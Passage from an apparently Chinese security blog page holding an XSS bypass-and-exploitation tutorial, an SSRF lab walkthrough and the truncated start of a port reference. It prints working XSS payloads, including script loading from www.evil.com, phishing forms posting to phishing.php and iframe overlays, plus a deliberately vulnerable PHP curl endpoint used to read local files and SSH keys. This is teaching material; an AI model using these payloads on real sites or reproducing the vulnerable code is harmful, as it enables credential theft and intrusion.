<li>4 对标签属性进行转码</li>
</ul>
<p>普通的标签属性值过滤还可以通过编码绕过，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascript:alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以写成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;&gt;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>5 自己构造事件</li>
</ul>
<p>不能依靠属性值运行xss的时候，我们可以尝试通过html事件来实现xss，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;#&quot; onerror=alert(&apos;xss&apos;) &gt;</span><br></pre></td></tr></table></figure></p>
<p>图片地址不存在，加载失败的时候就会运行后面的脚本</p>
<p>也可以在别的位置使用：<br>onload加载完成时运行<br>oncheck点击时运行<br>onmousemove当鼠标移动时运行</p>
<ul>
<li>6 注释过滤</li>
</ul>
<p>在样式表中，/**/中间的内容会被浏览器忽略，在css中，我们可以使用expression执行js代码，这个时候遇到黑名单过滤，我们就可以通过添加无意义的注释符号来避开过滤。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;xss:expr/*xss*/ession(alert(&apos;xss&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>7 拆分跨站</li>
</ul>
<p>有的网站输入框对输入长度有所限制，无法构造出完整的xss代码，这个时候有一种十分巧妙的拆分法可供选择，如我们要输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(&apos;&lt;script src=http://www.evil.com/hack.js&gt;&lt;/script&gt;&apos;)</span><br></pre></td></tr></table></figure></p>
<p>但是输入框限制每次只能输入30个字符时，我们可以：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=&apos;document.&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;write(&quot;&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;&lt;script&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;src=htt&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;p://www&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;.evil.c&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;om/hack&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;.js&gt;&lt;/s&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;cript&gt;&quot;&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;)&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;eval(z)&apos;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>这样就成功将代码拼接在z中，再通过eval(z)执行代码。</p>
<h2 id="0x03-cookie劫持"><a href="#0x03-cookie劫持" class="headerlink" title="0x03 cookie劫持"></a>0x03 cookie劫持</h2><p>cookie劫持在上一篇的跨站脚本攻击中已经详细演示过，具体方法就是通过用户点击链接访问页面，执行恶意xss代码然后将用户的浏览器cookie发送到我们自己的远程服务器，然后通过cookie来登陆。</p>
<h2 id="0x04-xss钓鱼"><a href="#0x04-xss钓鱼" class="headerlink" title="0x04 xss钓鱼"></a>0x04 xss钓鱼</h2><p>xss钓鱼是xss最常用的利用方式，有很多种实现方式：</p>
<ul>
<li>xss重定向钓鱼</li>
</ul>
<p>我们在一个网页找到了xss漏洞：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.123.com/index.php?input=[Expliot]</span><br></pre></td></tr></table></figure></p>
<p>构造如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.123.com/index.php?input=&lt;script&gt;document.location.href=&quot;http://www.hack.com&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>就可以通过xss重定向，将网页跳转到<a href="http://www.hack.com" target="_blank" rel="noopener">www.hack.com</a></p>
<ul>
<li>HTML注入式钓鱼</li>
</ul>
<p>仍然假设有如下漏洞页面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.123.com/index.php?input=[Expliot]</span><br></pre></td></tr></table></figure></p>
<p>然后我们在input里面写入一段html代码，就会在正常的网页中增添一个我们构造的登陆表单：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.hack.com/index.php?input=&quot;&apos;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;div style=&quot;text-align: center;&quot;&gt;&lt;form</span><br><span class="line">Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br/&gt;Login:&lt;br/&gt;</span><br><span class="line">&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br /&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>然后通过这个表单覆盖网页中的部分位置，就很容易引诱用户输入账号密码。</p>
<ul>
<li>iframe钓鱼</li>
</ul>
<p>iframe是HTML标签，作用是文档中的文档，或者浮动的框架(FRAME)。iframe元素会创建包含另外一个文档的内联框架。<br>我们先来看一个iframe的例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;body&#123;</span><br><span class="line">      margin:0px;</span><br><span class="line">	  border:0px;</span><br><span class="line">	  padding:0px;</span><br><span class="line">  &#125;</span><br><span class="line">iframe&#123;border:0px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;iframe src=&quot;http://www.baidu.com/&quot; id=&quot;iframepage&quot; name=&quot;iframepage&quot;  width=&quot;100%&quot; height=&quot;100%&quot; &gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>这样我们可以用百度页面覆盖整个网页。</p>
<p>而xss-iframe钓鱼就是攻击者在有xss的网站中用iframe框架调用自己的黑页，覆盖整个页面或者登陆框，将数据传给自己。<br>我们可以先在自己的<a href="http://www.hack.com搭建好完全和对方相同的网页，并且在后台写好接收保存账号密码的php文件，然后将style和iframe写在xss中" target="_blank" rel="noopener">www.hack.com搭建好完全和对方相同的网页，并且在后台写好接收保存账号密码的php文件，然后将style和iframe写在xss中</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;body&#123;margin:0px;border:0px;padding:0px;&#125;</span><br><span class="line">iframe&#123;border:0px;&#125;</span><br><span class="line">&lt;iframe src=&quot;http://www.hack.com/&quot;width=&quot;100%&quot; height=&quot;100%&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p>
<p>就会覆盖整个网页，并且将数据传给我们的网站。而且用户访问这个网站时url仍然是原本的url。</p>
<h2 id="0x05-http-history-hack"><a href="#0x05-http-history-hack" class="headerlink" title="0x05 http history hack"></a>0x05 http history hack</h2><p>css中有个属性visited，可以设置访问过的链接样式，然后xss可以通过遍历检查css中的visited属性，来查看一个用户是否访问过某些网站。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt; script &gt;</span><br><span class="line">var websites = [要检测的访问过的网址列表（自己补充）];</span><br><span class="line">//遍历每个URL</span><br><span class="line">for (var i = 0; i &lt; websites.length: i++) &#123;</span><br><span class="line">    var link = document.createElement(&quot;a&quot;);</span><br><span class="line">    link.id = &quot;id&quot; + i;</span><br><span class="line">    link.href = websites[i];</span><br><span class="line">    link.innerHTML = websites[i];</span><br><span class="line">    document.write(&apos;&lt;style&gt;&apos;);</span><br><span class="line">    document.write(&apos;#id&apos; + i + &quot;:visited &#123;color:#FF0000;&#125;&quot;);</span><br><span class="line">    document.write(&apos;&lt;/style&gt;&apos;);</span><br><span class="line">    document.body.appendChild(link);</span><br><span class="line">    var color = document.defaultView.getComputedStyle(link, null).getPropertyValue(&quot;color&quot;);</span><br><span class="line">    document.body.removeChild(link);</span><br><span class="line">    if (color == &quot;rgb(255,0,0)&quot;) &#123; //visited</span><br><span class="line">        var item = document.createElement(&apos;li&apos;);</span><br><span class="line">        item.appendChild(link);</span><br><span class="line">        document.getElementById(&apos;visited&apos;).appendChild(item);</span><br><span class="line">    &#125; else &#123; //Not visited</span><br><span class="line">        var item = document.createElement(&apos;li&apos;);</span><br><span class="line">        item.appendChild(link);</span><br><span class="line">        document.getElementById(&apos;notvisited&apos;).appendChild(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; &lt; /script&gt;/</span><br></pre></td></tr></table></figure></p>
<h2 id="0x06-xss网页挂马"><a href="#0x06-xss网页挂马" class="headerlink" title="0x06 xss网页挂马"></a>0x06 xss网页挂马</h2><p>在存储型xss中，我们可以将自己的xss代码提交上去，然后链接我们的木马，这样每个访问有xss页面的人都会触发木马。</p>
<h2 id="0x07-xss-Wrom"><a href="#0x07-xss-Wrom" class="headerlink" title="0x07 xss Wrom"></a>0x07 xss Wrom</h2><p>xss wrom即xss蠕虫，在一些存在存储型xss漏洞的大型社交网站，如果我们将xss代码的功能写成让访问到的人，在自己的主页里或其他有权限的页面提交一个一样的xss代码，这样浏览他的主页的人也会受到xss wrom影响继续写xss代码，这样就会很快传遍整个网络，危害极大。<br>而且xss蠕虫通常使用了大量的Ajax技术，即异步请求，无须刷新即可传输数据，隐蔽性高，传播速度极快。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/23/SSRF服务端请求伪造/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/04/23/SSRF服务端请求伪造/" itemprop="url">
                  SSRF服务端请求伪造
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-23T23:06:44+08:00">
                2018-04-23
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/04/23/SSRF服务端请求伪造/" class="leancloud_visitors" data-flag-title="SSRF服务端请求伪造">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-SSRF服务端请求伪造"><a href="#0x00-SSRF服务端请求伪造" class="headerlink" title="0x00 SSRF服务端请求伪造"></a>0x00 SSRF服务端请求伪造</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。与CSRF跨站请求伪造不同,它是利用服务端向其他内外网服务器发送请求。</p>
<h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。如果应用程序对用户提供的URL和远端服务器返回的信息没有进行合适的验证和过滤，就可能存在服务端请求伪造的缺陷。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p>
<h2 id="0x02-危害"><a href="#0x02-危害" class="headerlink" title="0x02 危害"></a>0x02 危害</h2><ul>
<li><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
</li>
<li><p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
</li>
<li><p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
</li>
<li><p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>
</li>
<li><p>5.利用file协议读取本地文件等。</p>
</li>
</ul>
<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><p>首先我们创建一个test.html,输入如下内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form name=&quot;ssrf&quot; method=&quot;post&quot; action=&quot;http://127.0.0.1/ssrf/test.php&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;url&quot; value=&quot;&quot; style=&quot;width:500px&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;commit&quot; value=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>ps:这里我修改css是为了截图时候能截取的全面点，可以不加。</p>
<p>然后写他对应的后台文件test.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">if (isset($_POST[&apos;url&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$link = $_POST[&apos;url&apos;];</span><br><span class="line">$filename = &apos;./curled/&apos;.rand().&apos;txt&apos;;</span><br><span class="line">$curlobj = curl_init($link);</span><br><span class="line">$fp = fopen($filename,&quot;w&quot;);</span><br><span class="line">curl_setopt($curlobj, CURLOPT_FILE, $fp);</span><br><span class="line">curl_setopt($curlobj, CURLOPT_HEADER, 0);</span><br><span class="line">curl_exec($curlobj);</span><br><span class="line">curl_close($curlobj);</span><br><span class="line">fclose($fp);</span><br><span class="line">$fp = fopen($filename,&quot;r&quot;);</span><br><span class="line">$result = fread($fp, filesize($filename)); </span><br><span class="line">fclose($fp);</span><br><span class="line">echo $result;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>其中：</p>
<ul>
<li>curl_init — 初始化一个cURL会话</li>
<li>curl_setopt — 设置一个cURL传输选项。</li>
<li>CURLOPT_FILE — 设置输出文件的位置，值是一个资源类型，默认为STDOUT (浏览器)。</li>
<li>CURLOPT_HEADER — 启用时会将头文件的信息作为数据流输出。</li>
<li>curl_exec — 执行一个cURL会话（在初始和设置选项完成后使用）</li>
</ul>
<p>然后我们通过输入框输入想要访问的url，就会加载对应的url过来，比如我们输入百度主页：</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssrf/ssrf01.png" alt=""></p>
<p>就会返回：</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssrf/ssrf02.png" alt=""></p>
<p>至此我们环境搭建完成。</p>
<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>我们上面提到了五种利用方式，我们拿其中的几种做一次实验。</p>
<p>首先是端口扫描，如果我们要对内网端口进行扫描，就可以在这里输入127.0.0.1和对应端口进行尝试。</p>
<p>如我们想查看mysql的banner信息，我们就可以输入127.0.0.1:3306</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssrf/ssrf03.png" alt=""></p>
<p>就可以看到一部分信息。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssrf/ssrf04.png" alt=""></p>
<p>然后是访问web应用默认文件，比如我们尝试wamp默认界面。直接输入127.0.0.1，访问wamp的默认信息，可以搜集到很多有用的信息。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssrf/ssrf05.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssrf/ssrf06.png" alt=""></p>
<p>最后再来尝试一下利用file协议访问本地文件，file协议具体用法是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file///c:/abc/filename.txt</span><br></pre></td></tr></table></figure></p>
<p>file后面与http不同，有三个斜杠，然后跟本地路径和文件，这里可以是任何格式的文件，虽然在网页上显示的时候会有部分无法显示。</p>
<p>我们尝试一个txt文件，发现可以读取。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssrf/ssrf07.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssrf/ssrf08.png" alt=""></p>
<p>再尝试一个存放ssh密钥的敏感目录，发现，配置文件和密钥内容其实都可以访问。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssrf/ssrf09.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ssrf/ssrf10.png" alt=""></p>
<h2 id="0x05-应对"><a href="#0x05-应对" class="headerlink" title="0x05 应对"></a>0x05 应对</h2><ul>
<li><p>1.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件,那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
</li>
<li><p>2.统一设置错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
</li>
<li><p>3.限制请求的端口仅为http常用的端口，比如，80,443,8080,8090。</p>
</li>
<li><p>4.将内网ip加入黑名单。</p>
</li>
<li><p>5.禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等。</p>
</li>
</ul>
<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>SSRF漏洞不如sql注入，xss，文件上传等漏洞有名，所以在很多地方疏于防范，其造成的危害不可小觑。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/23/常用端口笔记/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/04/23/常用端口笔记/" itemprop="url">
                  常用端口笔记
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-23T21:05:43+08:00">
                2018-04-23
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/笔记/" itemprop="url" rel="index">
                    <span itemprop="name">笔记</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/04/23/常用端口笔记/" class="leancloud_visitors" data-flag-title="常用端口笔记">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>熟知常用端口作用和容易引发的问题是网络安全中重要的一部分，这里记录一下常见端口的作用，用作笔记。</p>
<h2 id="0x01-各端口作用"><a href="#0x01-各端口作用" class="headerlink" title="0x01 各端口作用"></a>0x01 各端口作用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span 